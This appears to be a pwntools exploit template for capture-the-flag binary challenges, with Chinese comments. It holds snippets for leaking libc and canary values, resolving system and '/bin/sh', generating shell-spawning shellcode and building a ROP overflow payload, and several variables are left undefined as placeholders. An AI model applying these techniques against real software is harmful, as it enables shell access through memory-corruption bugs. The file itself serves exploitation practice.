#!python
#!/usr/bin/env python
# -*- coding: UTF-8 –*-
# coding=utf-8

from pwn import *
from LibcSearcher import *

raw_input()  # 暂时中断调试

context.log_level = "debug"
context(log_level="debug", arch="amd64", os="linux")

p = process("./pwn")
# p = remote('ip',port)

elf = ELF("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# 通过后三位访问 https://libc.blukat.me/ 以 fun + xxx 的方式找到 libc 版本

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
fun_addr = elf.sym["function"]

leak_addr = int(p.recv(14), 16)  # 16进制转换
log.success("leak_addr:" + hex(leak))
leak1 = u64(p.recv(6).ljust(8, "\x00"))  # 左对齐 用 \x00 补齐
canary = u32(p.recv(3).rjust(4, "\x00"))  # 右对齐 用 \x00 补齐
canary = u64(p.recv(7).rjust(8, "\x00"))  # 右对齐 用 \x00 补齐

libcsearcher = LibcSearcher("printf", printf_got_leak_addr)
libcbase = printf_got_leak_addr - libcsearcher.dump("printf")
system_addr = libcbase + libcsearcher.dump("system")
binsh_addr = libcbase + libcsearcher.dump("str_bin_sh")

shellcode = asm(shellcraft.sh())

p.recv()
p.recvuntil()

p.send()
p.sendline()

payload = "a" * offset + p64(ret_addr)
payload += p64(pop_rdi_ret)
payload += p64(fun_got_offset)
payload += p64(puts_plt_offset)
payload += p64(main_addr)
